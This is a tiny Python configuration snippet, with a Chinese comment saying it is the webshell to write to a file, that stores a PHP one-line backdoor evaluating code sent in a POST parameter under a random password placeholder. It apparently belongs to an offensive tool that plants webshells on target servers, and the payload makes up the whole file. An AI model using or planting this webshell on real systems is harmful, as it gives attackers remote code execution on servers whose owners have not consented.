# coding:utf-8
config = {}
# 要写入文件的webshell
config['webshell'] = '''<?php @eval($_POST[__RANDPASS__]); ?>'''